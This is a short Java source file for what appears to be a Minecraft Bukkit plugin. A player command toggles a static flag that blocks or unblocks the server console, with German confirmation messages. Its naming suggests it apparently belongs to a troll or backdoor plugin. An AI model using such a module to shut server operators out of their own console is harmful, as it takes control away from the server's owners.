package me.maiko.modules.blocking;

import org.bukkit.entity.Player;

import me.maiko.main.Main;
import me.maiko.module.Module;

public class ConsoleBlock_Mod extends Module{
	public static Boolean KonsoleBlock = false; 
	public ConsoleBlock_Mod() {
		super("ConsoleBlock");
	}
	
	@Override
	public void onCommand(String[] args, Player p) {
		if (KonsoleBlock) {
			KonsoleBlock = false;
			p.sendMessage(Main.Prefix + "Die Konsole ist nun nichtmehr blockiert!");

		} else {
			KonsoleBlock = true;
			p.sendMessage(Main.Prefix + "Du hast die Konsole blockiert!");
		}
	
	}

}
